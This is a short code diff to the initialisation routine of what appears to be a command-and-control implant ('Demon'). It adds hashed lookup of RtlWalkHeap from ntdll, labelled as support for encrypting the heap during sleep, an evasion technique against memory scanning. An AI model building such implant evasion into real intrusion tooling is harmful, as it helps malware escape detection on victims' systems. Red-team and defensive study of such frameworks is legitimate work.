@@ -314,6 +314,8 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.RtlAllocateHeap                   = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLALLOCATEHEAP );
         Instance->Win32.RtlReAllocateHeap                 = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLREALLOCATEHEAP );
         Instance->Win32.RtlFreeHeap                       = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLFREEHEAP );
+        /* ARC-04: heap walk for per-sleep encryption */
+        Instance->Win32.RtlWalkHeap                       = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLWALKHEAP );
         Instance->Win32.RtlExitUserThread                 = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLEXITUSERTHREAD );
         Instance->Win32.RtlExitUserProcess                = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLEXITUSERPROCESS );
         Instance->Win32.RtlRandomEx                       = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLRANDOMEX );
